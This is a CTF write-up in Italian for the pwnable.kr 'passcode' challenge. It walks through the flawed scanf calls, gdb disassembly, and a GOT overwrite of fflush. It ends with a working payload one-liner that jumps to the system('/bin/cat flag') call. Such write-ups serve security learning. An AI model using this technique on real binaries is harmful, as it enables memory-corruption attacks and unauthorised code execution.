@@ -1,0 +1,245 @@
+## 5. passcode
+
+Questa sfida é stata finora sicuramente la piú impegnativa, ma anche quella da cui probabilmente ho imparato di piú, ho spento 2 pomeriggi interi a capire l'approccio con cui affrontare questa challenge.
+
+Aprendo la finestra della challenge possiamo leggere il prompt che ci viene fornito:
+
+"
+Mommy told me to make a passcode based login system.
+My initial C code was compiled without any error!
+Well, there was some compiler warning, but who cares about that?
+
+ssh passcode@pwnable.kr -p2222 (pw:guest)
+"
+
+Il ragazzetto del problema dice di aver creato un sistema di login basato su password e che il codice ha compilato senza errori, MA c'erano alcuni warning.
+Logghiamoci quindi nella shell remota e quando arriviamo nella home notiamo che ci sono 3 file, il file flag, passcode.c e il suo rispettivo eseguibile.
+Leggiamo quindi il codice del programma facendo cat passcode.c:
+"
+#include <stdio.h>
+#include <stdlib.h>
+
+void login(){
+	int passcode1;
+	int passcode2;
+
+	printf("enter passcode1 : ");
+	scanf("%d", passcode1);
+	fflush(stdin);
+
+	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
+	printf("enter passcode2 : ");
+        scanf("%d", passcode2);
+
+	printf("checking...\n");
+	if(passcode1==338150 && passcode2==13371337){
+                printf("Login OK!\n");
+                system("/bin/cat flag");
+        }
+        else{
+                printf("Login Failed!\n");
+		exit(0);
+        }
+}
+
+void welcome(){
+	char name[100];
+	printf("enter you name : ");
+	scanf("%100s", name);
+	printf("Welcome %s!\n", name);
+}
+
+int main(){
+	printf("Toddler's Secure Login System 1.0 beta.\n");
+
+	welcome();
+	login();
+
+	// something after login...
+	printf("Now I can safely trust you that you have credential :)\n");
+	return 0;	
+}
+"
+Subito si puó notare che i warning di cui si parlava prima appartengono alla funzione scanf, le due variabili passcode1 e passcode2 vengono dichiarate, ma non inizializzate, se il programma fosse scritto correttamente verrebbero inizializzate con i valori forniti dall'utente tramite le due chiamate a scanf, tuttavia ciȯ non accade a causa dell'errore presente nella chiamata della funzione.
+La funzione scanf prende 2 argomenti, il primo é il formato dell'input che si vuole ricevere, il secondo é l'INDIRIZZO della variabile dove vogliamo che il nostro input sia salvato.
+L'errore sta proprio nel fatto che il programma non passa a scanf gli indirizzi delle variabili passcode1 e 2 tramite la e commerciale &, bensí passa le variabili stesse, quindi gli indirizzi passati saranno i valori contenuti nelle due variabili, le quali peró non sono inizializzate e i loro valori sono casuali, perció questo porta ad un comportamento pericoloso e vulnerabile che dovremo sfruttare per permetterci di arrivare a quel system("/bin/cat flag").
+
+OK, quindi tralasciando l'errore di codice osserviamo che l'andamento del programma si struttura eseguendo prima la funzione welcome, che prende come input il nostro nome, una stringa di max 100 caratteri, e ci saluta, poi passiamo alla funzione login dove dovremo inserire le nostre password, queste password saranno confrontate con due valori interi scritti in maniera nuda e cruda all'interno dell'if statement, 338150 e 13371337, i due valori hardcoded ci saranno utili a rintracciare gli indirizzi di memoria dei due passcode.
+
+Proviamo ad eseguire il programma e a fare cio che ci dice:
+
+passcode@pwnable:~$ ./passcode
+Toddler's Secure Login System 1.0 beta.
+enter you name : ziopera
+Welcome ziopera!
+enter passcode1 : 338150
+Segmentation fault (core dumped)
+
+Se proviamo a scegliere la via semplice otteniamo un bel segmentation fault in faccia, chiaramente perché come detto prima l'errata chiamata di scanf ci fa accedere ad aree di memoria dove non dovremo stare, perció salta tutto.
+Proviamo ad inserire piú di 100 caratteri superando il limite di grandezza della stringa name e vediamo cosa succede:
+passcode@pwnable:~$ python -c 'print("A"*104)' | ./passcode 
+
+Toddler's Secure Login System 1.0 beta.
+enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
+enter passcode1 : enter passcode2 : checking...
+Login Failed!
+
+Osserviamo che non ci permette di inserire in seguito il valore di passcode1 e passcode2.
+Proviamo ora come prima a inserire una stringa normale e a dare come input di passcode1 dei caratteri anziché dei numeri.
+
+passcode@pwnable:~$ ./passcode
+Toddler's Secure Login System 1.0 beta.
+enter you name : ciao
+Welcome ciao!
+enter passcode1 : ciaoooo
+enter passcode2 : checking...
+Login Failed!
+
+Stavolta non otteniamo un segmentation fault, MA non ci fa comunque inserire il valore per passcode2.
+Andando a tentoni con diversi input non porterebbe a niente, perció meglio entrare nello specifico dell'esecuzione del programma con il vostro debugger di fiducia, nel mio caso il grandissimo gdb.
+
+Eseguiamo gdb passcode.
+
+Sappiamo che il programma gira intorno le 3 funzioni, login, welcome e chiaramente main.
+Quelle che piú ci interessano sono chiaramente login e welcome, la prima ad essere eseguita é proprio welcome, perció come prima cosa disassembliamo quest'ultima.
+
+(gdb) disas welcome
+Dump of assembler code for function welcome:
+   0x08048609 <+0>:	push   %ebp
+   0x0804860a <+1>:	mov    %esp,%ebp
+   0x0804860c <+3>:	sub    $0x88,%esp
+   0x08048612 <+9>:	mov    %gs:0x14,%eax
+   0x08048618 <+15>:	mov    %eax,-0xc(%ebp)
+   0x0804861b <+18>:	xor    %eax,%eax
+   0x0804861d <+20>:	mov    $0x80487cb,%eax
+   0x08048622 <+25>:	mov    %eax,(%esp)
+   0x08048625 <+28>:	call   0x8048420 <printf@plt>
+   0x0804862a <+33>:	mov    $0x80487dd,%eax
+   0x0804862f <+38>:	lea    -0x70(%ebp),%edx
+   0x08048632 <+41>:	mov    %edx,0x4(%esp)
+   0x08048636 <+45>:	mov    %eax,(%esp)
+   0x08048639 <+48>:	call   0x80484a0 <__isoc99_scanf@plt>
+   0x0804863e <+53>:	mov    $0x80487e3,%eax
+   0x08048643 <+58>:	lea    -0x70(%ebp),%edx
+   0x08048646 <+61>:	mov    %edx,0x4(%esp)
+   0x0804864a <+65>:	mov    %eax,(%esp)
+   0x0804864d <+68>:	call   0x8048420 <printf@plt>
+   0x08048652 <+73>:	mov    -0xc(%ebp),%eax
+   0x08048655 <+76>:	xor    %gs:0x14,%eax
+   0x0804865c <+83>:	je     0x8048663 <welcome+90>
+   0x0804865e <+85>:	call   0x8048440 <__stack_chk_fail@plt>
+   0x08048663 <+90>:	leave  
+   0x08048664 <+91>:	ret    
+End of assembler dump.
+
+Bene, possiamo vedere le chiamate delle funzioni che sappiamo vengono eseguite in welcome, ossia printf, scanf e un altro printf, una domanda che possiamo porci e che ci aiuterebbe molto é, dove si trova la variabile char name[100]?
+Per rispondere a questa domanda osserviamo i dintorni della chiamata a scanf, poiché sappiamo che scanf mette all'interno di name ció che gli forniamo.
+
+   0x08048643 <+58>:	lea    -0x70(%ebp),%edx
+Questa linea in particolare carica l'indirizzo contenuto in edx all'indirizzo di memoria ebp-0x70, il registro edx é uno dei general purpose registers dell'assembly x86, ma in particolare esso é specializzato per le operazioni di input/output, proprio ció che serve a noi.
+Possiamo quindi assumere che la variabile name sia contenuta a partire da $ebp-0x70, andiamo quindi a verificare.
+Impostiamo un breakpoint sull'indirizzo associato all'operazione (poiché DA QUEL CHE HO CAPITO [potrei sbagliarmi] gli indirizzi a sinistra associati alle istruzioni di destra in realtá contengono l'istruzione successiva)
+break *0x08048643
+
+E facciamo partire il programma:
+(gdb) r
+Starting program: /home/passcode/passcode 
+Toddler's Secure Login System 1.0 beta.
+enter you name : ciao
+
+Breakpoint 1, 0x08048643 in welcome ()
+
+Una volta entrati nel breakpoint esaminiamo il contenuto di $ebp-0x70 con il comando x (examine) e specifichiamo che vogliamo il nostro output formattato a stringa (tramite lo /s).
+(gdb) x/s $ebp-0x70
+0xffa82fa8:	"ciao"
+
+Perfetto! Ora sappiamo che char name[100] si trova all'indirizzo $ebp-0x70
+Ora vediamo se con questi 100 caratteri possiamo andare a modificare altri luoghi di memoria, in particolare quelli che a noi interessano ovviamente sono passcode1 e passcode2, con lo stesso procedimento usato ora, cerchiamo i loro indirizzi.
+
+Disassembliamo login e osserviamo.
+(gdb) disas login
+Dump of assembler code for function login:
+   0x08048564 <+0>:	push   %ebp
+   0x08048565 <+1>:	mov    %esp,%ebp
+   0x08048567 <+3>:	sub    $0x28,%esp
+   0x0804856a <+6>:	mov    $0x8048770,%eax
+   0x0804856f <+11>:	mov    %eax,(%esp)
+   0x08048572 <+14>:	call   0x8048420 <printf@plt>
+   0x08048577 <+19>:	mov    $0x8048783,%eax
+   0x0804857c <+24>:	mov    -0x10(%ebp),%edx
+   0x0804857f <+27>:	mov    %edx,0x4(%esp)
+   0x08048583 <+31>:	mov    %eax,(%esp)
+   0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
+   0x0804858b <+39>:	mov    0x804a02c,%eax
+   0x08048590 <+44>:	mov    %eax,(%esp)
+   0x08048593 <+47>:	call   0x8048430 <fflush@plt>
+   0x08048598 <+52>:	mov    $0x8048786,%eax
+   0x0804859d <+57>:	mov    %eax,(%esp)
+   0x080485a0 <+60>:	call   0x8048420 <printf@plt>
+   0x080485a5 <+65>:	mov    $0x8048783,%eax
+   0x080485aa <+70>:	mov    -0xc(%ebp),%edx
+   0x080485ad <+73>:	mov    %edx,0x4(%esp)
+   0x080485b1 <+77>:	mov    %eax,(%esp)
+   0x080485b4 <+80>:	call   0x80484a0 <__isoc99_scanf@plt>
+   0x080485b9 <+85>:	movl   $0x8048799,(%esp)
+   0x080485c0 <+92>:	call   0x8048450 <puts@plt>
+   0x080485c5 <+97>:	cmpl   $0x528e6,-0x10(%ebp)
+   0x080485cc <+104>:	jne    0x80485f1 <login+141>
+   0x080485ce <+106>:	cmpl   $0xcc07c9,-0xc(%ebp)
+   0x080485d5 <+113>:	jne    0x80485f1 <login+141>
+   0x080485d7 <+115>:	movl   $0x80487a5,(%esp)
+   0x080485de <+122>:	call   0x8048450 <puts@plt>
+   0x080485e3 <+127>:	movl   $0x80487af,(%esp)
+   0x080485ea <+134>:	call   0x8048460 <system@plt>
+   0x080485ef <+139>:	leave  
+   0x080485f0 <+140>:	ret    
+   0x080485f1 <+141>:	movl   $0x80487bd,(%esp)
+   0x080485f8 <+148>:	call   0x8048450 <puts@plt>
+   0x080485fd <+153>:	movl   $0x0,(%esp)
+   0x08048604 <+160>:	call   0x8048480 <exit@plt>
+End of assembler dump.
+
+In questo caso riconosciamo al volo i due indirizzi da due cose:
+	- La prima é che basta applicare lo stesso ragionamento di prima, si cercano istruzioni che usano il registro edx intorno a scanf e probabilmente quelli saranno gli indirizzi dove sono contenuti passcode1 e passcode2, cosí facendo notiamo
+	   0x0804857c <+24>:    mov    -0x10(%ebp),%edx
+	   0x080485aa <+70>:    mov    -0xc(%ebp),%edx
+	  Il primo, $ebp-0x10, sará passcode1, il secondo, $ebp-0xc, sará passcode2.
+        - Il secondo modo é cercare il nostro if statement che va a confrontare i due valori con le due password, un if statement in assembly é rappresentato dal comando cmpl che mette a confronto due valori, nel nostro caso ne troviamo due:
+	   0x080485c5 <+97>:    cmpl   $0x528e6,-0x10(%ebp) # Confronto tra passcode1 ($ebp-0x10) e la prima password nel codice
+	   0x080485ce <+106>:   cmpl   $0xcc07c9,-0xc(%ebp) # Confronto tra passcode2 ($ebp-0xc) e la seconda password nel codice
+
+In entrambi i casi otteniamo gli stessi risultati.
+Osserviamo che se name[100] si trova a $ebp-0x70 e passcode1 si trova a $ebp-0x10, allora abbiamo una collisione, questo perché 0x70-0x10=0x60 ossia 96 in decimale, siccome name tiene 100 caratteri questo ci dice che gli ultimi 4 caratteri di name sono letti all'interno di passcode1 e interpretati come un intero, abbiamo trovato il modo in cui aggireremo questo codice scritto male.
+
+Come detto prima il fatto che scanf sia stato scritto male senza la & che prende gli indirizzi delle variabili indica che la funzione scriverá nei luoghi di memoria il cui indirizzo é il valore contenuto nelle variabili, passcode1 non é inizializzata e il suo valore é quindi indefinito, ma noi abbiamo capito che grazie a name possiamo scrivere ció che vogliamo all'interno di passcode1. Se scriviamo un indirizzo all'interno di passcode1 tramite la stringa name, con la seguente chiamata di scanf dedicata a passcode1 riusciremo a scrivere all'indirizzo che abbiamo posto all'interno di passcode1, un bel casino.
+
+Ma come possiamo sfruttare ora questo per riuscire ad eseguire il nostro caro system("/bin/cat flag")? Non possiamo utilizzare lo stesso approccio che ci ha consentito di completare la sfida bof poiché abbiamo capito che non possiamo cambiare entrambi i valori di passcode1 e 2 con un overflow.
+Abbiamo peró il potere di cambiare il contenuto di un indirizzo di memoria, e per parecchie ore mi sono chiesto come poter sfruttare in pratica questo potere.
+Purtroppo non sono riuscito ad arrivarci da solo, perció ho dovuto ricercare un pó e leggendo un write up di un utente sono venuto a conoscenza della GOT, la Global Offset Table, una tabella che é presente in ogni programma eseguibile e che viene caricata quando questi programmi vengono eseguiti che contiene gli indirizzi del codice delle funzioni presenti in C.
+In pratica quando il programma non é ancora stato eseguito possiamo notare che ad esempio se proviamo a disassemblare la funzione fflush, non otteniamo il codice della funzione, ma dei jmp statement che saltano ai luoghi di memoria dove sta il codice della funzione.
+(gdb) disas fflush
+Dump of assembler code for function fflush@plt:
+   0x08048430 <+0>:	jmp    *0x804a004
+   0x08048436 <+6>:	push   $0x8
+   0x0804843b <+11>:	jmp    0x8048410
+End of assembler dump.
+ 
+Un jmp statement ci permette di saltare dove vogliamo all'interno del programma, esso fa proprio al caso nostro poiché sta saltando ad un indirizzo puntato da un altro indirizzo, in pratica 0x804a004 contiene al suo interno un altro indirizzo, che possiamo scoprire con x 0x804a004, si tratta di 0x08048436.
+Per completare la sfida ci basterá quindi inserire dentro passcode1 l'indirizzo 0x804a004 e modificare il suo contenuto inserendo l'indirizzo della chiamata a system.
+Per l'indirizzo di system non dovremo prendere quello direttamente alla sinistra della call, ma quello della riga prima.
+  0x080485e3 <+127>:   movl   $0x80487af,(%esp) # Questo!
+  0x080485ea <+134>:   call   0x8048460 <system@plt> # Non questo!
+
+Il payload definitivo sará quindi:
+
+python -c 'print("A"*96 + "\x04\xa0\x04\x08"  + "134514147")'
+
+134514147 é il valore decimale che corrisponde all'indirizzo 0x080485e3, questo perché scanf é formattato ad accettare interi e non stringhe.
+Se eseguiamo:
+passcode@pwnable:~$ python -c 'print("A"*96 + "\x04\xa0\x04\x08"  + "134514147")' | ./passcode 
+Toddler's Secure Login System 1.0 beta.
+enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
+Sorry mom.. I got confused about scanf usage :(
+enter passcode1 : Now I can safely trust you that you have credential :)
+
+Missione compiuta!
